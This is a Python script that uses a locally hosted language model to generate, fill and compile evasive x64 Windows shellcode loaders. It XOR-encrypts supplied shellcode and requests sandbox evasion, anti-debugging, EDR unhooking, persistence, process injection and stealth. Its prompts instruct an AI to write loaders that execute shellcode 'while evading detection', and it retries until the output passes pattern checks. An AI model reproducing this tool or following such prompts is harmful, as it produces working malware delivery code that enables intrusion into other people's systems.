import argparse
import logging
import json
import os
from openai import OpenAI
import re
from pathlib import Path

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_parameters():
    parser = argparse.ArgumentParser(description="Generate code based on specified parameters.")
    
    # Required parameters
    parser.add_argument("--allocation_method", type=str, required=True,
                       choices=["virtualprotect", "virtualalloc"],
                       help="Memory allocation method")
    parser.add_argument("--execution_method", type=str, required=True,
                       choices=["createremotethread", "timesetevent", "settimer", 
                               "etwpcreateetwthread", "fiber", "pointer"],
                       help="Shellcode execution method")
    
    # Optional parameters with defaults
    parser.add_argument("--language", type=str, default="C",
                       help="Programming language")
    
    # Optional parameters with None as default
    parser.add_argument("--sleep_time", type=int,
                       help="Initial sleep delay in milliseconds")
    parser.add_argument("--unhooking_method", type=str,
                       choices=["patch_jmp", "text_section_rewrite"],
                       help="Unhooking method")
    parser.add_argument("--sleep_mask", type=str,
                       choices=["dynamic", "static"],
                       help="Sleep mask method")
    parser.add_argument("--pause_mechanic", type=str,
                       choices=["sleep", "busy_loop", "yield", "thread_sleep"],
                       help="Pausing mechanic")
    parser.add_argument("--sandbox_checks", type=str,
                       choices=["registry", "file_system", "processes", "behavioral"],
                       help="Sandbox checks")
    parser.add_argument("--sandbox_evasion", type=str,
                       choices=["process_hollowing", "moving_shellcode", "anti_vm", "other"],
                       help="Sandbox evasion techniques")
    parser.add_argument("--persistence", type=str,
                       choices=["registry", "startup", "scheduled_tasks", "autoruns"],
                       help="Persistence mechanisms")
    parser.add_argument("--encryption_method", type=str,
                       choices=["xor", None],
                       default=None,
                       help="Shellcode encryption method (XOR or None for unencrypted)")
    parser.add_argument("--injection_target", type=str,
                       choices=["self", "remote", "early_bird"],
                       help="Injection target process")
    parser.add_argument("--process_creation", type=str,
                       choices=["normal", "suspended", "ppid_spoof"],
                       help="Process creation method")
    parser.add_argument("--memory_protection", type=str,
                       choices=["normal", "dynamic", "guard"],
                       help="Memory protection scheme")
    parser.add_argument("--thread_context", type=str,
                       choices=["standard", "fiber", "apc"],
                       help="Thread context manipulation")
    parser.add_argument("--syscall_method", type=str,
                       choices=["Native", "direct", "indirect", "hell"],
                       help="System call invocation method")
    
    # Boolean flags
    parser.add_argument("--anti_debugging", action="store_true",
                       help="Include anti-debugging techniques")
    parser.add_argument("--anti_virtualization", action="store_true",
                       help="Include anti-virtualization techniques")
    parser.add_argument("--network_communication", action="store_true",
                       help="Include network communication features")
    parser.add_argument("--obfuscation", action="store_true",
                       help="Include code obfuscation techniques")
    parser.add_argument("--stealth", action="store_true",
                       help="Include stealth evasion techniques")
    
    # Add new arguments for shellcode handling
    parser.add_argument("--shellcode_file", type=str,
                       help="Path to raw shellcode file")
    parser.add_argument("--xor_key", type=str,
                       default="DEADBEEFDEADBEEF",
                       help="XOR encryption/decryption key in hex format (e.g., DEADBEEFDEADBEEF)")

    args = parser.parse_args()
    return vars(args)

def xor_encrypt_shellcode(shellcode_bytes, key):
    """Encrypt shellcode using XOR with the given key."""
    try:
        # Convert hex string to bytes if key is a hex string
        if isinstance(key, str):
            key = bytes.fromhex(key.replace('0x', ''))
        
        # Use bytearray for better memory efficiency
        encrypted = bytearray(len(shellcode_bytes))
        key_length = len(key)
        
        # Process in chunks for better performance with large shellcode
        for i in range(0, len(shellcode_bytes)):
            encrypted[i] = shellcode_bytes[i] ^ key[i % key_length]
        
        # Verify encryption
        if all(a == b for a, b in zip(encrypted, shellcode_bytes)):
            raise ValueError("XOR encryption failed - output matches input")
            
        return encrypted
        
    except Exception as e:
        logging.error(f"XOR encryption failed: {str(e)}")
        raise

def format_shellcode_array(encrypted_bytes):
    """Format encrypted shellcode as a C-style byte array."""
    return f"""unsigned char shellcode[] = {{
    {", ".join(f"0x{b:02x}" for b in encrypted_bytes)}
}};
"""

def validate_xor_key(key):
    """Validate XOR key format and length."""
    try:
        # Remove '0x' prefix if present
        key = key.replace('0x', '')
        # Check if valid hex
        if not re.match(r'^[0-9A-Fa-f]+$', key):
            raise ValueError("XOR key must be in hex format")
        # Check minimum length (8 bytes = 16 hex chars)
        if len(key) < 16:
            logging.warning(f"XOR key {key} is less than 8 bytes, padding with DEADBEEF")
            # Pad the key to 8 bytes by repeating it
            key = (key * ((16 + len(key) - 1) // len(key)))[:16]
        return key
    except Exception as e:
        logging.error(f"XOR key validation failed: {str(e)}")
        raise

def read_and_encrypt_shellcode(shellcode_path, xor_key=None, encryption_method=None):
    """Read shellcode file, optionally encrypt it, and return C-style array."""
    try:
        # Add magic bytes check for common formats
        with open(shellcode_path, 'rb') as f:
            header = f.read(4)
            f.seek(0)  # Reset to start
            
            # Check if this might be a PE file instead of raw shellcode
            if header.startswith(b'MZ') or header.startswith(b'PE'):
                raise ValueError("File appears to be a PE file, not raw shellcode")
            
            shellcode = f.read()
            
            # Validate shellcode isn't null-heavy (potential indicator of corruption)
            null_count = shellcode.count(b'\x00')
            if null_count / len(shellcode) > 0.5:  # If more than 50% nulls
                logging.warning("Shellcode contains unusually high number of null bytes")
            
            # Only encrypt if encryption_method is specified
            if encryption_method == "xor":
                validated_key = validate_xor_key(xor_key)
                shellcode = xor_encrypt_shellcode(shellcode, validated_key)
                
                # Verify encryption worked by checking if output differs from input
                if shellcode == f.read():
                    raise ValueError("Encryption failed - output matches input")
            
            return format_shellcode_array(shellcode)
            
    except Exception as e:
        logging.error(f"Error processing shellcode: {str(e)}")
        raise

def validate_code(code):
    """Enhanced validation with more flexible patterns and better error reporting."""
    required_patterns = {
        'memory_protection': r'(VirtualProtect|PAGE_EXECUTE_READ|PAGE_READWRITE)\s*[\(\s]',
        'memory_cleanup': r'(SecureZeroMemory|RtlSecureZeroMemory|ZeroMemory|memset|RtlZeroMemory)\s*[\(\s]',
        'error_handling': r'(if\s*\([^)]+\)\s*{[\s\S]*?return|FAILED|SUCCEEDED|GetLastError|ERROR_)',
        'shellcode_array': r'(unsigned\s+char|BYTE|PBYTE)\s+shellcode\s*\['
    }
    
    missing_patterns = []
    for name, pattern in required_patterns.items():
        if not re.search(pattern, code, re.IGNORECASE | re.MULTILINE | re.DOTALL):
            missing_patterns.append(name)
            logging.warning(f"Missing required implementation: {name}")
    
    # Additional validation for specific security patterns
    security_patterns = {
        'proper_cleanup': r'(VirtualFree|LocalFree|HeapFree|CloseHandle)',
        'size_calculation': r'(sizeof\s*\(\s*shellcode\s*\)|shellcode_size)',
    }
    
    for name, pattern in security_patterns.items():
        if not re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
            logging.warning(f"Missing recommended security feature: {name}")
    
    return len(missing_patterns) == 0, missing_patterns

def generate_code(client, params, max_tokens=15000):
    # Modify system prompt based on encryption settings
    encryption_info = (
        f"- Encryption: {params['encryption_method']} with key: {params['xor_key']}"
        if params.get('encryption_method')
        else "- No encryption"
    )
    
    system_prompt = [
        "You are an AI specialized in creating complete, functional x64 Windows shellcode loaders. ",
        "Your task is to create a secure loader that can decrypt and execute shellcode while evading detection.",
        "The loader should handle memory allocation, protection, and cleanup properly.",
        "IMPORTANT: Output ONLY compilable code within a single code block. No explanations, comments, notes, etc.",
        f"Technical Requirements:",
        f"- Language: {params.get('language', 'C')}",
        f"- Allocation: {params['allocation_method']}",
        f"- Execution: {params['execution_method']}",
        encryption_info,
        "Security Requirements:",
        "- SecureZeroMemory for sensitive data cleanup",
        "- Full error handling for all API calls",
        "- Proper memory protection (VirtualProtect)",
        "- In-memory decryption only when needed",
        "- Complete cleanup in success/failure paths",
        "All functions must be fully implemented with working logic - no placeholders or TODOs."
    ]
    
    # Add optional parameters to system prompt if they exist
    optional_params = {
        'sleep_mask': 'Sleep Mask',
        'pause_mechanic': 'Pause Mechanic',
        'unhooking_method': 'Unhooking Method',
        'sandbox_checks': 'Sandbox Checks',
        'sandbox_evasion': 'Sandbox Evasion',
        'persistence': 'Persistence',
        'encryption_method': 'Encryption',
        'injection_target': 'Injection Target',
        'process_creation': 'Process Creation',
        'memory_protection': 'Memory Protection',
        'thread_context': 'Thread Context',
        'syscall_method': 'Syscall Method'
    }
    
    for param, display_name in optional_params.items():
        if params.get(param):
            system_prompt.append(f"{display_name}: {params[param]}, ")
    
    # Add boolean flags if enabled
    boolean_params = {
        'anti_debugging': 'Anti-Debugging',
        'anti_virtualization': 'Anti-VM',
        'network_communication': 'Network Features',
        'obfuscation': 'Obfuscation',
        'stealth': 'Stealth'
    }
    
    for param, display_name in boolean_params.items():
        if params.get(param):
            system_prompt.append(f"{display_name}: enabled, ")
    
    system_prompt.append("Include detailed error handling and memory cleanup.")
    
    # Build user prompt dynamically
    user_prompt = [
        f"Generate a complete, production-ready {params.get('language', 'C')} shellcode loader that:\n",
        "1. Includes all necessary headers and imports\n",
        "2. Place 'unsigned char shellcode[] = { /* shellcode bytes will be inserted here */ };' at file scope\n",
        "3. Include a robust decryption function with these requirements:\n",
        "   - Decrypt shellcode in-place to minimize memory copies\n",
        "   - Clear the key from memory after decryption\n",
        "   - Return status codes for error handling\n",
        "4. Implement proper cleanup in this order:\n",
        "   - Free/unmap any allocated memory\n",
        "   - Reset memory permissions to original state\n",
        "   - Clear sensitive data from memory\n",
        "5. All code must reference 'shellcode' as the shellcode array variable name\n"
    ]
    
    # If sleep_time exists, this becomes item 3, and all subsequent items shift down
    if params.get('sleep_time'):
        user_prompt.append(f"6. Implements initial sleep/delay of {params['sleep_time']}ms\n")
    
    # Adjust the numbering for the remaining items
    
    # Add required parameters
    user_prompt.extend([
        f"{7 if params.get('sleep_time') else 6}. Uses {params['allocation_method']} for memory allocation\n",
        f"{8 if params.get('sleep_time') else 7}. Uses {params['execution_method']} for execution\n"
    ])
    
    # Add optional parameters if they exist
    prompt_index = 9
    for param, display_name in optional_params.items():
        if params.get(param):
            user_prompt.append(f"{prompt_index}. Implements {params[param]} for {display_name}\n")
            prompt_index += 1
    
    # Add boolean parameters if enabled
    for param, display_name in boolean_params.items():
        if params.get(param):
            user_prompt.append(f"{prompt_index}. Implements {display_name} techniques\n")
            prompt_index += 1
    
    user_prompt.extend([
        f"{prompt_index}. Includes proper memory cleanup and error handling\n",
        f"{prompt_index + 1}. Includes appropriate entry point (EXE format)\n",
        "Provide the complete code with proper structure and formatting."
    ])

    # Update user prompt to explicitly request required implementations
    user_prompt.extend([
        "The code MUST include ALL of the following implementations:\n",
        "1. Memory protection using VirtualProtect\n",
        "2. Memory cleanup using SecureZeroMemory or RtlSecureZeroMemory\n",
        "3. Error handling with proper return statements for each API call\n",
        "4. Shellcode array declaration at file scope with dynamic size calculation\n",
        "5. XOR decryption implementation\n",
        "6. Proper cleanup handling (VirtualFree/LocalFree/HeapFree)\n",
        "7. Use sizeof(shellcode) for all size calculations, never hardcode sizes\n",
    ])

    # Add explicit placeholder requirement to user prompt
    user_prompt.extend([
        "IMPORTANT: Use this exact placeholder for shellcode array declaration:\n",
        "unsigned char shellcode[] = { /* SHELLCODE_PLACEHOLDER */ };\n",
        "const SIZE_T shellcode_size = sizeof(shellcode);\n",
    ])

    messages = [
        {"role": "system", "content": "".join(system_prompt)},
        {"role": "user", "content": "".join(user_prompt)}
    ]
    
    # Update the validation check to use the module-level validate_code function
    completion = client.chat.completions.create(
        model="model-identifier",
        messages=messages,
        max_tokens=max_tokens,
        temperature=0.7,
    )

    response_content = completion.choices[0].message.content
    code_block = re.search(r"```(?:\w+)?\s*([\s\S]*?)```", response_content, re.DOTALL)
    
    if code_block:
        code_content = code_block.group(1).strip()
        
        # Update shellcode pattern to look specifically for placeholder
        shellcode_pattern = r'unsigned char shellcode\[\]\s*=\s*\{\s*/\*\s*SHELLCODE_PLACEHOLDER\s*\*/\s*\};'
        
        # If shellcode file is provided, insert the encrypted shellcode
        if params.get('shellcode_file'):
            encrypted_shellcode = read_and_encrypt_shellcode(
                params['shellcode_file'], 
                params.get('xor_key'),
                params.get('encryption_method')
            )
            
            if not re.search(shellcode_pattern, code_content, re.MULTILINE):
                logging.warning("AI response did not use the required shellcode placeholder format")
                # Insert placeholder if missing
                code_content = re.sub(
                    r'unsigned char shellcode\[\]\s*=\s*\{[\s\S]*?\};',
                    'unsigned char shellcode[] = { /* SHELLCODE_PLACEHOLDER */ };',
                    code_content
                )
            
            # Replace placeholder with actual shellcode
            code_content = re.sub(shellcode_pattern, encrypted_shellcode, code_content)

        # Use the module-level validate_code function
        is_valid, missing_patterns = validate_code(code_content)
        if not is_valid:
            error_msg = "Generated code is incomplete. Missing implementations for: " + ", ".join(missing_patterns)
            logging.error(error_msg)
            
            # Enhanced retry logic with context
            retry_attempts = 3  # Allow multiple retry attempts
            
            while retry_attempts > 0:
                is_valid, missing_patterns = validate_code(code_content)
                if is_valid:
                    break
                
                logging.warning(f"Attempt {3 - retry_attempts + 1}: Missing implementations: {missing_patterns}")
                
                # Enhanced retry prompt with original parameters
                retry_prompt = [
                    {"role": "system", "content": """
Previous code generation was incomplete. You are enhancing an existing shellcode loader.
You must maintain all originally requested functionality while adding missing implementations."""},
                    {"role": "user", "content": f"""
Original requirements:
IMPORTANT: Output ONLY compilable code within a single code block. No explanations, comments, notes, etc.
- Allocation Method: {params['allocation_method']}
- Execution Method: {params['execution_method']}
- Language: {params.get('language', 'C')}
{f"- Sleep Time: {params['sleep_time']}ms" if params.get('sleep_time') else "0"}
{f"- Unhooking Method: {params['unhooking_method']}" if params.get('unhooking_method') else "False"}
{f"- Sleep Mask: {params['sleep_mask']}" if params.get('sleep_mask') else "False"}
{f"- Pause Mechanic: {params['pause_mechanic']}" if params.get('pause_mechanic') else "False"}
{f"- Sandbox Checks: {params['sandbox_checks']}" if params.get('sandbox_checks') else "False"}
{f"- Sandbox Evasion: {params['sandbox_evasion']}" if params.get('sandbox_evasion') else "False"}
{f"- Persistence: {params['persistence']}" if params.get('persistence') else "False"}
{f"- Encryption Method: {params['encryption_method']}" if params.get('encryption_method') else "False"}
{f"- Injection Target: {params['injection_target']}" if params.get('injection_target') else "False"}
{f"- Process Creation: {params['process_creation']}" if params.get('process_creation') else "False"}
{f"- Memory Protection: {params['memory_protection']}" if params.get('memory_protection') else "False"}
{f"- Thread Context: {params['thread_context']}" if params.get('thread_context') else "False"}
{f"- Syscall Method: {params['syscall_method']}" if params.get('syscall_method') else "False"}
{"- Anti-Debugging Enabled" if params.get('anti_debugging') else "False"}
{"- Anti-Virtualization Enabled" if params.get('anti_virtualization') else "False"}
{"- Network Communication Enabled" if params.get('network_communication') else "False"}
{"- Obfuscation Enabled" if params.get('obfuscation') else "False"}
{"- Stealth Enabled" if params.get('stealth') else "False"}

Here is the current code that needs improvement:

```c
{code_content}
```

Please modify this code to include the following missing implementations while maintaining all original requirements:
{', '.join(missing_patterns)}

The code should maintain its current structure but add these missing elements.
Keep all existing working functionality intact.
"""
                    }
                ]
                
                completion = client.chat.completions.create(
                    model="model-identifier",
                    messages=messages + retry_prompt,
                    max_tokens=max_tokens,
                    temperature=0.5,
                )
                
                retry_content = completion.choices[0].message.content
                retry_code_block = re.search(r"```(?:\w+)?\s*([\s\S]*?)```", retry_content, re.DOTALL)
                
                if retry_code_block:
                    code_content = retry_code_block.group(1).strip()
                
                retry_attempts -= 1
                
                # Add explicit break if no improvement after retry
                if retry_attempts == 0:
                    logging.error("Maximum retry attempts reached without successful validation")
                    break

            # Add handling for failed validation
            if not is_valid:
                logging.error("Failed to generate valid code after all retry attempts")
                return "Code generation failed validation after maximum retries"

        # Remove the template wrapping since the AI should provide complete code
        # We'll let the AI handle the full structure including headers, main/DllMain, etc.
        
        # Just write the code directly to file
        output_format = params.get("output_format", "EXE").upper()
        file_extension = "dll" if output_format == "DLL" else "c"  # Changed to .c for C files
        output_file = f"generated_code.{file_extension}"
        with open(output_file, "w") as file:
            file.write(code_content)
        
        logging.info(f"Code generated and saved to {output_file}")
        return code_content

    logging.warning("No code block found in the AI response")
    return "No code block found in the response."

def get_compile_command(code_content, output_format="EXE"):
    # Default compilation command for x64 Windows executable
    if output_format.upper() == "DLL":
        return "x86_64-w64-mingw32-gcc -shared -o loader.dll generated_code.c -lws2_32 -lwinmm"
    else:
        return "x86_64-w64-mingw32-gcc -o loader.exe generated_code.c -lws2_32 -lwinmm"

if __name__ == "__main__":
    setup_logging()
    params = get_parameters()
    logging.info("Parameters retrieved: %s", params)

    client = OpenAI(base_url="http://192.168.0.210:443/v1", api_key="lm-studio")
    code_output = generate_code(client, params)
    
    # Get compilation command and attempt to compile
    compile_command = get_compile_command(code_output, params.get("output_format", "EXE"))
    logging.info(f"Attempting compilation with command: {compile_command}")
    
    try:
        result = os.system(compile_command)
        if result == 0:
            logging.info("Compilation successful")
        else:
            logging.error(f"Compilation failed with exit code: {result}")
    except Exception as e:
        logging.error(f"Compilation error: {str(e)}")

    #print("Generated Code:\n")
    #print("```")
    #print(code_output.strip())
    #print("```")
